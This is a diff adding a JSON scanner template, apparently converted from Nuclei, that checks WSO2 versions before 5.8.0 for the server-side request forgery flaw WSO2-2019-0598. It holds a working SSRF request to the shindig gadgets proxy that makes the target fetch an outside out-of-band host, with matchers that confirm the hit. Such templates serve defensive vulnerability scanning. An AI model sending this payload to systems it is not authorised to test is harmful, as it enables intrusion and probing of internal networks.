@@ -1,0 +1,143 @@
+{
+  "id": "WSO2-2019-0598",
+  "name": "WSO2 \u003c5.8.0 - Server Side Request Forgery",
+  "author": "Amnotacat",
+  "severity": "MEDIUM",
+  "description": "WSO2 prior to version 5.8.0 is susceptible to a server-side request forgery vulnerability. This vulnerability can be exploited by misusing the UI gadgets loading capability of the shindig web application. An attacker can alter a specific URL in the request causing the server to initiate a GET request to the altered URL.\n",
+  "references": [
+    "https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2019-0598"
+  ],
+  "tags": [
+    "ssrf",
+    "wso2",
+    "shindig"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-918",
+  "cvssScore": "6.8",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/shindig/gadgets/proxy?container\u003ddefault\u0026url\u003dhttp://oast.pro",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "all",
+          "values": [
+            "Interactsh Server"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "WSO2-2019-0598",
+    "info": {
+      "name": "WSO2 \u003c5.8.0 - Server Side Request Forgery",
+      "author": "Amnotacat",
+      "severity": "medium",
+      "description": "WSO2 prior to version 5.8.0 is susceptible to a server-side request forgery vulnerability. This vulnerability can be exploited by misusing the UI gadgets loading capability of the shindig web application. An attacker can alter a specific URL in the request causing the server to initiate a GET request to the altered URL.\n",
+      "reference": [
+        "https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2019-0598"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N",
+        "cvss_score": "6.8",
+        "cwe_id": "CWE-918"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "ssrf,wso2,shindig"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/shindig/gadgets/proxy?container\u003ddefault\u0026url\u003dhttp://oast.pro"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "all",
+            "words": [
+              "Interactsh Server"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
